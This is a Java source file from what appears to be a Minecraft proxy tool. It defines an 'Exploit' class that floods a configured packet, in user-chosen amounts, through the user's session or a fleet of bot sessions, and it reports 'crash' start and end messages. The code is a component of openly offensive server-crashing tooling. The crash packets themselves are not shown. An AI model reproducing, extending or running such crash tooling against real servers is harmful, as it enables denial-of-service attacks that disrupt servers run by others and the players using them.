package xyz.yooniks.proxy.exploit;

import org.spacehq.packetlib.packet.Packet;
import xyz.yooniks.proxy.entity.bot.Bot;
import xyz.yooniks.proxy.json.JSONConfig;
import xyz.yooniks.proxy.message.MessageBuilder;
import xyz.yooniks.proxy.user.ProxyUser;

public class Exploit {

  private final ExploitManager exploitManager;
  private final JSONConfig config;

  private final String name;
  private final Packet mainPacket;

  public Exploit(ExploitManager exploitManager, JSONConfig config, String name, Packet mainPacket) {
    this.exploitManager = exploitManager;
    this.config = config;

    this.name = name;
    this.mainPacket = mainPacket;
  }

  public void start(ProxyUser executor, int amount, boolean bots) {
    final Runnable toRun = () -> {
      final long start = System.currentTimeMillis();
      executor.sendMessage(
            new MessageBuilder(this.config.crash_message_start)
                .withField("exploit", this.name)
                .withField("bots", bots ? "tak" : "nie")
                .withField("amount", String.valueOf(amount))
                .toString());
      if (bots) {
        for (int count = 0; count < amount; count++) {
          executor.getBots().stream()
              .map(Bot::getSession)
              .forEach(bot -> bot.send(this.mainPacket));
        }
        executor.sendMessage(
                new MessageBuilder(this.config.crash_message_end)
                    .withField("exploit", this.name)
                    .withField("time", String.valueOf(System.currentTimeMillis() - start))
                    .toString());
        return;
      }
      for (int count = 0; count < amount; count++) {
        if (!executor.asPlayer().isPresent()) {
          break;
        }
        executor.getFakeSession().ifPresent((session) ->
            session.send(this.mainPacket)
        );
      }
      executor.sendMessage(
              new MessageBuilder(this.config.crash_message_end)
                  .withField("exploit", this.name)
                  .withField("time", String.valueOf(System.currentTimeMillis() - start))
                  .toString());
    };
    this.exploitManager.addToQueue(toRun);
  }

  public String getName() {
    return name;
  }

}
